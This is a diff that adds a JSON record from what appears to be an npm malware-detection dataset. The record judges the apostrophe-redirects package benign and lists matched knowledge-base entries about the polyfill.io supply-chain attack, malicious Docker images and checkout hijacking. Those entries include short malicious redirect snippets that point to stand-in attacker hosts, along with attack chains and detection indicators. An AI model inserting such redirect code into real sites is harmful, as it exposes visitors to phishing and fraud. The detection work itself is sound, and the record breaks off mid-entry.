@@ -1,0 +1,472 @@
+{
+  "package_name": "apostrophe-redirects",
+  "package_version": "2.4.2",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:52:30.966252",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-redirects/2.4.2/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-redirects/2.4.2/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var _ = require('lodash');\n\nmodule.exports = {\n  extend: 'apostrophe-pieces',\n  name: 'apostrophe-redirect',\n  alias: 'redirects',\n  label: 'Redirect',\n  pluralLabel: 'Redirects',\n  searchable: false,\n  adminOnly: true,\n  withType: 'apostrophe-page',\n  statusCode: 302,\n  openGraph: false,\n  seo: false,\n  sitemap: false,\n  addFields: [\n    {\n      name: 'redirectSlug',\n      type: 'string',\n      label: 'Old URL',\n      help: 'Format with leading / such as /old-url',\n      required: true\n    },\n    {\n      type: 'slug',\n      name: 'slug',\n      label: 'Slug',\n      required: true,\n      contextual: true\n    },\n    {\n      name: 'title',\n      label: 'Description',\n      type: 'string',\n      required: true\n    },\n    {\n      type: 'boolean',\n      name: 'published',\n      label: 'Published',\n      required: true,\n      def: true,\n      contextual: true\n    },\n    {\n      name: 'urlType',\n      label: 'Link To',\n      type: 'select',\n      choices: [\n        { label: 'Internal Page', value: 'internal', showFields: [ '_newPage' ] },\n        { label: 'External URL', value: 'external', showFields: [ 'externalUrl' ] }\n      ]\n    },\n    {\n      name: 'ignoreQueryString',\n      label: 'Ignore query string when matching.',\n      type: 'boolean',\n      def: false\n    },\n    {\n      name: '_newPage',\n      type: 'joinByOne',\n      withType: 'apostrophe-page',\n      label: 'Page Title',\n      idField: 'pageId',\n      filters: {\n        projection: { slug: 1, title: 1, _url: 1 },\n        permission: false\n      }\n    },\n    {\n      name: 'externalUrl',\n      label: 'URL',\n      type: 'url'\n    },\n    {\n      name: 'statusCode',\n      label: 'Redirect Type',\n      type: 'select',\n      help: 'Test new redirects as temporary redirects first. Permanent redirects are an SEO best practice, but only if they are correct.',\n      choices: [\n        { label: 'Temporary', value: '302' },\n        { label: 'Permanent', value: '301' }\n      ],\n      def: '302'\n    }\n  ],\n  removeFields: ['tags'],\n  arrangeFields: [\n    {\n      name: 'info',\n      label: 'Info',\n      fields: [\n        'redirectSlug',\n        'title',\n        'urlType',\n        'ignoreQueryString',\n        '_newPage',\n        'externalUrl',\n        'statusCode'\n      ]\n    }\n  ],\n\n  beforeConstruct: function (self, options) {\n    var _newPage = _.find(options.addFields, { name: '_newPage' });\n    _newPage.withType = options.withType;\n\n    var field = _.find(options.addFields, { name: 'statusCode' });\n    if (!field) {\n      return;\n    }\n    field.def = options.statusCode.toString();\n    if (field.def === '301') {\n      field.help = 'By default, redirects are permanent and Google will cache them. Please proofread this carefully or test first with the \"temporary\" setting.';\n    }\n  },\n\n  construct: function (self, options) {\n    self.beforeSave = function (req, doc, options, callback) {\n      doc.slug = 'redirect-' + doc.redirectSlug;\n\n      if (!doc.title) {\n        doc.title = doc.redirectSlug;\n      }\n\n      return callback(null);\n    };\n\n    self.expressMiddleware = async (req, res, next) => {\n      let slug = req.url;\n      let pathOnly = slug.split('?')[0];\n      let redirectRegEx = new RegExp(`^redirect-${self.apos.utils.regExpQuote(pathOnly)}(\\?.*)?$`);\n\n      const workflow = self.apos.modules['apostrophe-workflow'];\n      const locales = workflow && Object.keys(workflow.locales).filter(locale => !locale.endsWith('-draft'));\n      const $or = locales && [\n        {\n          workflowLocale: {\n            $in: locales\n          }\n        },\n        {\n          workflowLocale: {\n            $exists: 0\n          }\n        }\n      ];\n\n      try {\n        const criteria = {\n          slug: redirectRegEx,\n          type: self.name,\n          trash: {\n            $ne: true\n          },\n          published: true\n        };\n        if ($or) {\n          criteria.$or = $or;\n        }\n        const results = await self.apos.docs.db.find(criteria).project({\n          title: 1,\n          slug: 1,\n          urlType: 1,\n          ignoreQueryString: 1,\n          pageId: 1,\n          type: 1,\n          externalUrl: 1,\n          redirectSlug: 1,\n          statusCode: 1,\n          _newPage: 1,\n          workflowLocale: 1\n        }).toArray();\n        const target = results &&\n          results.find(result => result.redirectSlug === slug) ||\n          results.find(result => result.redirectSlug === pathOnly && result.ignoreQueryString);\n        if (!target) {\n          return next();\n        }\n        let status = parseInt(target.statusCode);\n        if (isNaN(status) || !status) {\n          status = 302;\n        }\n        if (target.urlType === 'internal') {\n          const criteria = {\n            _id: target.pageId,\n            trash: {\n              $ne: true\n            },\n            published: true\n          };\n          if ($or) {\n            criteria.$or = $or;\n          }\n          const doc = await self.apos.docs.db.findOne(criteria);\n          if (doc) {\n            const manager = self.apos.docs.getManager(doc.type);\n            if (!manager) {\n              return next();\n            }\n            let oldLocale;\n            try {\n              oldLocale = req.locale;\n              req.locale = doc.workflowLocale;\n              target._newPage = await manager.find(req, { _id: target.pageId }).toObject();\n            } finally {\n              req.locale = oldLocale;\n            }\n          }\n          if (!target._newPage) {\n            return next();\n          }\n          return req.res.redirect(status, target._newPage._url);\n        } else if (target.urlType === 'external' && target.externalUrl.length) {\n          return req.res.redirect(status, target.externalUrl);\n        }\n        return next();\n      } catch (e) {\n        self.apos.utils.error(e);\n        return next();\n      }\n    };\n  }\n};",
+          "is_malicious": false,
+          "malice_score": 0.47638840675354005,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and modifies URL redirect data stored in a MongoDB database, using regular expressions to match incoming request URLs. It performs conditional redirects either internally by resolving page IDs to URLs or externally by redirecting to user-supplied external URLs, leveraging sensitive APIs such as database queries and HTTP redirection. This behavior enables URL redirection functionality that, if misused or manipulated, could facilitate open redirect vulnerabilities or unauthorized redirection to external URLs.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements a URL redirection module for the ApostropheCMS platform, allowing administrators to configure redirects from old URLs to internal pages or external URLs. While it uses sensitive APIs such as database queries and HTTP redirects, these are standard and expected for a redirect management feature. There is no obfuscation, no hardcoded malicious domains, no conditional redirects based on user environment or geolocation, and no evidence of data exfiltration or unauthorized system manipulation. The code performs validation and respects published status and locale filters, indicating legitimate use. The known malicious patterns involve hardcoded or dynamically generated redirects to attacker-controlled domains, obfuscation, or conditional targeting, none of which are present here. Therefore, despite the inherent risk of open redirect vulnerabilities if misconfigured, the code itself is not malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_132333_395634_snippet_2",
+              "source_package": "polyfill.io (CDN service) (CDN (not a package manager, but a third-party JavaScript CDN service))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_132333_395634/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49685654044151306,
+              "code_similarity": 0.373479962348938,
+              "behavior_similarity": 0.6202331185340881,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Representative redirect logic (obfuscated in real payload):\nif (window.location.hostname.match(/targetedsite\\.com/)) {\n  window.location.href = 'https://malicious-redirect.example/?geo=' + userGeo;\n}",
+                "code_behavior": "At runtime, the code checks the current hostname, and if it matches a targeted site, it redirects the user to a malicious external domain, potentially appending geolocation or other user data to the URL, resulting in user exposure to further attacks or phishing.",
+                "malice_analysis": {
+                  "why_suspicious": "Redirecting users to external, attacker-controlled domains based on runtime checks is a classic sign of web-based attacks. This behavior is especially suspicious when performed by a third-party CDN script, as it can be used for phishing, malware delivery, or further exploitation.",
+                  "violated_expectations": "Polyfill scripts are only expected to provide compatibility code and should never perform user redirection or interact with the DOM in a way that changes navigation.",
+                  "similar_legitimate_use": "Legitimate redirects may occur during authentication or payment flows, but never from a polyfill script or a third-party CDN not directly involved in application logic.",
+                  "key_indicators": [
+                    "Conditional redirect logic based on window.location.hostname",
+                    "Use of external, non-legitimate domains for redirection",
+                    "Customization of redirect URLs with user data (e.g., geolocation)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a user visits a website that includes cdn.polyfill.io.",
+                  "file_location": "Dynamically served JavaScript from cdn.polyfill.io, injected via <script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\">.",
+                  "required_permissions": [
+                    "network",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "polyfill.io (CDN service)",
+                  "package_manager": "CDN (not a package manager, but a third-party JavaScript CDN service)",
+                  "package_versions": "All versions served after February 2024 (post-acquisition by Funnull)",
+                  "why_malicious": "After its acquisition by Funnull in February 2024, the polyfill.io CDN service began serving malicious, obfuscated JavaScript payloads. These payloads inject unwanted redirects, selectively target mobile users, evade detection through delayed execution and environment checks, and can potentially exfiltrate user data. The code is dynamically generated and adapts its behavior, turning every website that includes cdn.polyfill.io into a potential supply chain attack vector."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A website includes a script tag referencing cdn.polyfill.io, causing the browser to load and execute the malicious JavaScript payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code executes in the user's browser environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious JavaScript checks for mobile devices, admin or analytics presence, and delays execution to evade detection.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Selective targeting of victims and evasion of security tools or manual analysis."
+                  },
+                  {
+                    "step": 3,
+                    "action": "If targeting conditions are met, the code injects a script from a typo-squatted analytics domain or performs redirects to malicious sites.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is redirected to attacker-controlled content or further malicious payloads are loaded."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Potential for further attacks such as formjacking or data exfiltration if the payload evolves or is updated.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Possible theft of user data, credentials, or sensitive information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated JavaScript payloads served from cdn.polyfill.io",
+                    "Dynamic script injection from typo-squatted analytics domains (e.g., www.googie-anaiytics.com)",
+                    "Conditional logic based on user agent, admin or analytics presence",
+                    "Delayed execution using setTimeout before performing malicious actions",
+                    "Unexpected redirects to non-legitimate or attacker-controlled domains",
+                    "Potential interception and exfiltration of form data"
+                  ],
+                  "file_indicators": [
+                    "<script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\">",
+                    "References to https://www.googie-anaiytics.com/gtags.js in dynamically injected scripts",
+                    "Obfuscated inline JavaScript with dynamic script injection logic"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to www.googie-anaiytics.com",
+                    "Redirects to domains associated with sports betting, pornography, or other malicious content",
+                    "Potential future exfiltration to attacker-controlled endpoints (e.g., https://attacker.example/collect)"
+                  ],
+                  "how_to_detect": "Scan website source code and network traffic for references to cdn.polyfill.io and typo-squatted analytics domains such as www.googie-anaiytics.com. Monitor for obfuscated JavaScript payloads that perform delayed execution, dynamic script injection, or conditional redirects. Use web application firewalls and browser security tools to block or alert on unexpected script sources and outbound requests to known malicious domains. Regularly audit third-party scripts and replace cdn.polyfill.io with trusted alternatives. Monitor for suspicious form data exfiltration to untrusted endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104232_826217_snippet_4",
+              "source_package": "Various typosquatted and malicious Docker images (Docker Hub)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104232_826217/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4893009662628174,
+              "code_similarity": 0.3662848174571991,
+              "behavior_similarity": 0.6123171448707581,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "res.writeHead(302, { 'Location': 'http://malicious-site.com' }); res.end();",
+                "code_behavior": "At container runtime, the code intercepts HTTP requests and responds with a 302 redirect to a hardcoded external domain, causing all web traffic to be redirected to a malicious website, which may be used for phishing or malware delivery.",
+                "malice_analysis": {
+                  "why_suspicious": "Automatic HTTP redirection to an untrusted, hardcoded domain is a common tactic for phishing, credential theft, or drive-by malware downloads.",
+                  "violated_expectations": "Legitimate images should not redirect user traffic to external, untrusted domains without clear documentation and user consent.",
+                  "similar_legitimate_use": "URL shorteners or legitimate web redirects, but these should be transparent, documented, and only redirect to trusted domains.",
+                  "key_indicators": [
+                    "HTTP 302 or 301 redirects to external domains",
+                    "Hardcoded URLs pointing to domains not associated with the legitimate project",
+                    "Redirect logic present in entrypoint or main server scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "container runtime",
+                  "file_location": "index.js or redirector script",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Various typosquatted and malicious Docker images",
+                  "package_manager": "Docker Hub",
+                  "package_versions": "Unverified Linux images (1,652 identified as malicious out of 250,000 scanned)",
+                  "why_malicious": "These Docker images are intentionally crafted or compromised to perform malicious actions such as crypto-mining, secrets exfiltration, DNS hijacking, and website redirection. Many are distributed via typosquatting, tricking users into downloading them by mimicking legitimate image names. The images contain embedded or runtime-fetched code that abuses system resources, steals sensitive data, or manipulates network traffic for attacker benefit."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs a typosquatted or malicious Docker image from Docker Hub.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of embedded or runtime-fetched malicious code at container startup."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at container runtime, performing actions such as crypto-mining, secrets exfiltration, DNS hijacking, or redirecting web traffic.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Resource abuse, data theft, network compromise, or user redirection."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Exfiltrated data or compromised resources are sent to attacker-controlled infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker achieves financial gain, data theft, or further compromise of user or organizational assets."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Docker images that download and execute remote scripts at runtime using curl or wget",
+                    "Access to sensitive environment variables (e.g., AWS, GCP, Azure credentials) and outbound HTTP POST to unknown or untrusted domains",
+                    "Modification or overwrite of /etc/resolv.conf or other DNS configuration files",
+                    "HTTP 302 or 301 redirects to untrusted external domains in web server code"
+                  ],
+                  "file_indicators": [
+                    "entrypoint.sh or startup scripts containing curl/wget commands to external domains",
+                    "Presence of mining software binaries (e.g., xmrig, minerd) or their installation scripts in image layers",
+                    "Python or shell scripts accessing cloud provider environment variables",
+                    "Unexpected or undocumented modifications to /etc/resolv.conf or DNS settings",
+                    "JavaScript files with hardcoded redirect logic to non-official domains"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known mining pool domains or IPs",
+                    "HTTP POST requests to webhook.site or similar data collection endpoints",
+                    "DNS queries directed to non-standard or attacker-controlled DNS servers",
+                    "HTTP redirects to domains flagged as malicious or unrelated to the legitimate project"
+                  ],
+                  "how_to_detect": "Scan Docker images for embedded or startup scripts that download and execute code from the internet, access sensitive environment variables, or modify system DNS settings. Use static analysis to flag images with suspicious entrypoint scripts, hardcoded secrets exfiltration logic, or redirect code in web server files. Monitor container runtime behavior for unexpected outbound network connections, especially to mining pools, webhook endpoints, or untrusted domains. Employ allow-lists for trusted images and domains, and alert on deviations. Correlate file, network, and behavioral indicators to identify malicious images with high confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102816_562821_snippet_1",
+              "source_package": "cdn.polyfill.io (CDN (not a package manager, but a third-party hosted JavaScript service))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102816_562821/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4543984532356262,
+              "code_similarity": 0.34014251828193665,
+              "behavior_similarity": 0.5686544179916382,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Obfuscated, dynamically generated JavaScript (example pattern):\n(function(){\n  if(/* device is mobile && not admin && no analytics detected */){\n    setTimeout(function(){\n      window.location.href = 'https://malicious-redirect.example';\n    }, 3000);\n  }\n})();",
+                "code_behavior": "At runtime, the code checks the user agent and HTTP headers to identify mobile devices, verifies the absence of admin users and analytics scripts, then after a 3-second delay, redirects the user to a malicious site. The code is obfuscated and dynamically generated per request, enabling selective targeting and evasion.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is delivered from a previously trusted CDN but now contains obfuscated logic, dynamic payload generation, and selective targeting based on user environment. These are classic hallmarks of a supply chain attack, especially as the code performs delayed redirection to external, non-legitimate domains.",
+                  "violated_expectations": "A legitimate polyfill service should only provide JavaScript compatibility shims and never perform user agent checks, delayed redirects, or obfuscate its logic. Redirecting users or injecting third-party scripts is entirely outside the expected behavior of a polyfill CDN.",
+                  "similar_legitimate_use": "User agent checks and redirects are legitimate in analytics or A/B testing code, but never in a polyfill library or CDN context, where only compatibility code should be present.",
+                  "key_indicators": [
+                    "Obfuscated and dynamically generated JavaScript served from cdn.polyfill.io",
+                    "Conditional logic to evade detection (checks for admin users and analytics scripts)",
+                    "Delayed execution using setTimeout before redirect",
+                    "Network redirection to non-legitimate or malicious domains",
+                    "Malicious payload delivered from a previously trusted CDN"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a user visits a website that includes the CDN script.",
+                  "file_location": "Dynamically served from cdn.polyfill.io and injected into HTML via <script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\"></script>.",
+                  "required_permissions": [
+                    "network access (to perform redirects or load additional resources)",
+                    "DOM access (to manipulate window.location and potentially inspect the DOM)",
+                    "access to cookies and local storage (to fingerprint users and check for analytics/admin status)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cdn.polyfill.io",
+                  "package_manager": "CDN (not a package manager, but a third-party hosted JavaScript service)",
+                  "package_versions": "All versions served after February 2024 (post-acquisition by Funnull)",
+                  "why_malicious": "After its acquisition by Funnull in February 2024, cdn.polyfill.io was modified to serve obfuscated, dynamically generated malicious JavaScript to every website that included its CDN link. The injected code selectively targets users, evades detection by fingerprinting the environment, and can redirect users to malicious domains or inject further payloads, turning every use of the CDN into a supply chain attack vector capable of data theft, phishing, and user redirection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A website includes <script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\"></script> in its HTML, loading the polyfill script from the CDN.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious JavaScript is loaded into every visitor's browser from the compromised CDN."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious JavaScript (snippet_1) executes in the user's browser, fingerprinting the environment by checking for mobile devices, admin users, and the presence of analytics scripts.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "If the conditions are met (e.g., mobile device, not admin, no analytics), the attack proceeds to the next stage."
+                  },
+                  {
+                    "step": 3,
+                    "action": "After a delay, the code either redirects the user to a malicious site or injects a fake analytics script (snippet_2) that loads further malicious payloads or redirects.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "The user is redirected to scam, betting, or adult sites, or additional malicious payloads are loaded based on geolocation."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated JavaScript dynamically served from cdn.polyfill.io",
+                    "Conditional execution based on user agent, admin status, or presence of analytics scripts",
+                    "Delayed execution of redirects or script injections using setTimeout",
+                    "Dynamic injection of scripts from typosquatted analytics domains (e.g., googie-anaiytics.com)"
+                  ],
+                  "file_indicators": [
+                    "<script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\"></script>",
+                    "References to https://www.googie-anaiytics.com/gtags.js in injected script tags"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to cdn.polyfill.io for JavaScript payloads",
+                    "Outbound requests to googie-anaiytics.com for injected scripts",
+                    "Redirects to domains associated with scams, betting, or adult content originating from polyfill scripts"
+                  ],
+                  "how_to_detect": "Scan web application source code and runtime DOM for references to cdn.polyfill.io. Monitor network traffic for requests to cdn.polyfill.io and typosquatted analytics domains such as googie-anaiytics.com. Use behavioral analysis to detect obfuscated JavaScript that performs conditional redirects or script injections, especially if triggered only for mobile users or after a delay. Flag any unexpected script injections or redirects originating from polyfill scripts, and alert on the presence of script tags referencing non-legitimate analytics domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_200708_775046_snippet_1",
+              "source_package": "polyfill.io (CDN service, as used by npm packages such as create-polyfill-service-url and dynamic-polyfill) (npm (and any web project embedding the CDN))",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20240824_200708_775046/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4497312903404236,
+              "code_similarity": 0.34662020206451416,
+              "behavior_similarity": 0.552842378616333,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious redirect logic (reconstructed from reports)\nif (/Mobi|Android/i.test(navigator.userAgent)) {\n  window.location.href = 'https://scam-landing.example.com/?ref=' + encodeURIComponent(window.location.href);\n}",
+                "code_behavior": "At runtime, the code inspects the user's browser user agent string to determine if the visitor is on a mobile device, then forcibly redirects the browser to an attacker-controlled scam site, resulting in user redirection and exposure to phishing or fraud.",
+                "malice_analysis": {
+                  "why_suspicious": "The code performs user agent detection and forcibly redirects users to an external, attacker-controlled domain, which is not expected or legitimate behavior for a polyfill library. This redirection is automatic and targets mobile users, increasing the likelihood of successful phishing or fraud.",
+                  "violated_expectations": "A polyfill service is expected to provide compatibility code for older browsers only, without performing user agent checks for malicious redirection or interacting with the DOM in a way that changes navigation. Injecting redirection logic into a widely used CDN script fundamentally violates the trust and purpose of such a service.",
+                  "similar_legitimate_use": "User agent checks and redirection may be used in legitimate contexts for mobile site optimization or A/B testing, but never within a polyfill CDN script, which should be limited to feature detection and polyfill delivery. In this context, such behavior is entirely out of scope and malicious.",
+                  "key_indicators": [
+                    "User agent sniffing for mobile devices within a polyfill script",
+                    "Forced redirection to external, attacker-controlled domains from a CDN script",
+                    "Presence of non-polyfill logic (e.g., window.location manipulation) in a polyfill CDN file",
+                    "Malicious code injected into all sites using the CDN, not just a single application"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a user visits a website embedding the CDN script",
+                  "file_location": "Served JavaScript from cdn.polyfill.io (injected into web pages via <script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\"></script>)",
+                  "required_permissions": [
+                    "network access (to perform redirects)",
+                    "DOM access (to read window.location and navigator.userAgent)",
+                    "redirect capability (to change window.location.href)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "polyfill.io (CDN service, as used by npm packages such as create-polyfill-service-url and dynamic-polyfill)",
+                  "package_manager": "npm (and any web project embedding the CDN)",
+                  "package_versions": "All versions using cdn.polyfill.io after domain ownership change (February 2024 onward)",
+                  "why_malicious": "After a change in domain ownership in February 2024, the polyfill.io CDN began serving malicious JavaScript. The CDN injected code that redirected mobile users to attacker-controlled scam sites, impacting any website or npm package embedding scripts from cdn.polyfill.io. This represents a supply chain attack, as the malicious code was automatically delivered to all dependent sites and packages, enabling widespread user redirection, phishing, and potential further compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A website or npm package embeds the polyfill.io CDN script via a <script> tag or dependency.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious JavaScript is loaded into the user's browser from cdn.polyfill.io."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious JavaScript executes in the browser context upon page load.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The script checks if the visitor is on a mobile device by inspecting the user agent string."
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is on a mobile device, the script redirects the browser to a scam site controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The user is exposed to phishing, fraud, or further malware via the scam landing page."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Polyfill CDN script performing user agent checks and conditional redirection logic",
+                    "Unexpected network requests or browser redirects to domains unrelated to polyfill.io from polyfill scripts",
+                    "Polyfill scripts containing obfuscated, minified, or non-polyfill logic such as window.location manipulation or DOM-based redirection"
+                  ],
+                  "file_indicators": [
+                    "<script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\"></script>",
+                    "Any JavaScript file loaded from cdn.polyfill.io after February 2024",
+                    "Presence of user agent sniffing and window.location.href assignment in polyfill CDN scripts"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP(S) requests or browser redirects from polyfill scripts to attacker-controlled domains (e.g., scam-landing.example.com or similar scam infrastructure)",
+                    "Any HTTP(S) requests initiated by polyfill scripts to domains not affiliated with polyfill.io or its legitimate maintainers"
+                  ],
+                  "how_to_detect": "Monitor for websites or npm packages loading scripts from cdn.polyfill.io, especially after February 2024. Analyze loaded polyfill scripts for non-standard logic, such as user agent checks and window.location redirects. Use Content Security Policy (CSP) violation reports to detect unexpected script sources or redirections. Flag any polyfill CDN usage after the domain's change of ownership as high risk. Correlate network logs for outbound requests or redirects to non-polyfill domains initiated by polyfill scripts, and inspect for the presence of user agent sniffing and redirection logic within CDN-delivered JavaScript."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113231_378126_snippet_1",
+              "source_package": "N/A (general customer hijacking malware/adware) (N/A (web-based, not a package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113231_378126/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4416815936565399,
+              "code_similarity": 0.3524400591850281,
+              "behavior_similarity": 0.5309231281280518,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example: Malicious redirect script\nif (window.location.pathname.includes('checkout')) {\n  window.location.href = 'https://competitor-site.com/offer';\n}",
+                "code_behavior": "At runtime, the code checks if the current page URL contains 'checkout', then forcibly redirects the user's browser to a competitor's external site, resulting in the interruption of the purchase process and exfiltration of customer traffic.",
+                "malice_analysis": {
+                  "why_suspicious": "The script actively monitors for the checkout page and, upon detection, redirects the user to an external competitor domain. This behavior is highly abnormal and directly sabotages the store's sales funnel, indicating intentional customer hijacking.",
+                  "violated_expectations": "Legitimate checkout scripts are expected to facilitate secure and seamless purchase completion within the store or redirect only to trusted, pre-approved payment gateways. Redirecting to a competitor or unrelated third-party domain is never expected and constitutes a severe violation of business logic.",
+                  "similar_legitimate_use": "Legitimate redirects may occur for payment processing (e.g., to PayPal or Stripe), but only to domains explicitly authorized and controlled by the merchant. Such redirects are typically whitelisted and auditable.",
+                  "key_indicators": [
+                    "JavaScript code that inspects window.location.pathname for 'checkout' or 'cart' keywords",
+                    "Redirects (window.location.href or similar) to external, non-affiliated domains, especially competitor URLs",
+                    "Script presence in page source not matching the store's official codebase, often injected via third-party ad networks or unauthorized script tags",
+                    "Redirect logic triggered specifically during the checkout or cart process, not during normal browsing"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a customer navigates to the checkout page during their shopping session",
+                  "file_location": "Injected JavaScript within the online store's web page source, typically via third-party ad scripts or unauthorized script injection",
+                  "required_permissions": [
+                    "Access to the DOM to read window.location.pathname",
+                    "Network access to perform browser redirects",
+                    "Ability to execute in the context of the checkout/cart page"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (general customer hijacking malware/adware)",
+                  "package_manager": "N/A (web-based, not a package manager)",
+                  "package_versions": "N/A",
+                  "why_malicious": "Malicious JavaScript code or ads are embedded in the online store's web page, hijacking customers by redirecting them to competitor sites specifically during the checkout process. This results in direct loss of sales, undermines customer trust, and indicates unauthorized manipulation of the store's critical purchase flow."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious or unauthorized JavaScript code is injected into the online store's web page, typically through compromised third-party ad scripts or direct script injection.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The malicious script is loaded and executed in the customer's browser during their shopping session."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the customer navigates to the checkout or cart page, the injected script detects this context and triggers a redirect to a competitor's external site.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "The customer is forcibly redirected away from the store, often completing their purchase on the competitor's site, resulting in lost sales and potential data leakage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected browser redirects initiated from checkout or cart pages to external domains not on an allowlist",
+                    "JavaScript code that programmatically checks for 'checkout' or 'cart' in the URL and triggers window.location or similar navigation changes",
+                    "Network requests or browser navigation events targeting competitor or unrelated third-party domains during the checkout process"
+                  ],
+                  "file_indicators": [
+                    "Presence of injected or obfuscated JavaScript code in the checkout or cart page source that is not part of the official codebase",
+                    "Third-party ad scripts or script tags containing redirect logic or referencing unfamiliar external sources"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests or browser redirects from checkout/cart pages to competitor domains (e.g., 'https://competitor-site.com/offer')",
+                    "Unusual spikes in redirect events or navigation changes away from checkout endpoints, especially to domains not associated with payment processing"
+                  ],
